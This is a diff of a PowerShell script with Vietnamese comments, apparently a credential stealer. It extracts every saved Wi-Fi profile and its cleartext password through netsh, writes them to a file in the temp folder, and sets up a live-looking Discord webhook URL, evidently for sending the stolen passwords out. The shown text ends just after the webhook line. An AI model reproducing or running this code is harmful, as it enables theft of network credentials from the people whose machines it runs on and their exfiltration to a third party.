@@ -1,15 +1,33 @@
 ############################################################################################################################################################
 
-$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
-
-
-$wifiProfiles > $env:TEMP/--wifi-pass.txt
+# Lấy dữ liệu
+$wifiProfiles = (netsh wlan show profiles) |
+    Select-String "\:(.+)$" |
+    %{
+        $name=$_.Matches.Groups[1].Value.Trim()
+        $_
+    } |
+    %{
+        (netsh wlan show profile name="$name" key=clear)
+    } |
+    Select-String "Key Content\W+\:(.+)$" |
+    %{
+        $pass=$_.Matches.Groups[1].Value.Trim()
+        $_
+    } |
+    %{
+        [PSCustomObject]@{ PROFILE_NAME=$name; PASSWORD=$pass }
+    }
 
 # In ra màn hình
 $wifiProfiles | Format-Table -AutoSize
 
-# Xuất ra file tạm
-$wifiProfiles | Format-Table -AutoSize | Out-String > "$env:TEMP/--wifi-pass.txt"
+# Xuất ra file
+$outFile = "$env:TEMP\--wifi-pass.txt"
+$wifiProfiles | Format-Table -AutoSize | Out-String | Out-File $outFile
+
+# Đọc lại file (nếu muốn kiểm tra)
+Get-Content $outFile
 
 # Webhook Discord
 $dc = "https://discord.com/api/webhooks/1479100377625399358/JbkoOkNwYnhMNSBvcrvdIYDI5mSFR_qW_bD_QMDgpmwmipl4TX_B3R_xucnpXWKNx_Hj"
